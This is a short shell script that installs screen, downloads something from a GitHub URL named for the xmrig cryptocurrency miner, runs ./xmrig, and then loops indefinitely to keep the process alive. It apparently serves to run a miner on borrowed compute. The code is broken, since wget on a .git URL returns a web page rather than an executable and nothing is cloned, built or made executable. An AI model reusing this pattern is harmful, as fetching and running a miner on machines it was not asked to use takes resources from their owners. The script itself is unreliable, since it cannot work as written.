#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/AWAJJ/xmrig.git
./xmrig
while [ 1 ]; do
sleep 3
done
sleep 999
